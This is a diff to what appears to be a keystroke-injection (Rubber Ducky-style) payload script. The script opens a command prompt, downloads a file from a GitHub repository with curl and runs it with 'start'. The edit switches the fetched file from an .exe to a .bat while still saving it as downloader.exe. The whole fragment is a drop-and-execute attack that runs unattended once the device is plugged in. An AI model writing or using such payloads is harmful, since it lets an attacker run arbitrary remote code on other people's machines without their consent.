@@ -21,11 +21,11 @@ STRING cmd
 DELAY 500
 ENTER
 DELAY 700
-STRING curl -L -o downloader.exe https://github.com/fezarosa-dev/entrega_edu_fis/raw/main/downloader.exe
+STRING curl -L -o downloader.exe https://github.com/fezarosa-dev/entrega_edu_fis/raw/main/downloader.bat
 DELAY 500
 ENTER
 DELAY 700
-STRING start downloader.exe
+STRING start downloader.bat
 DELAY 500
 ENTER
 STRING exit
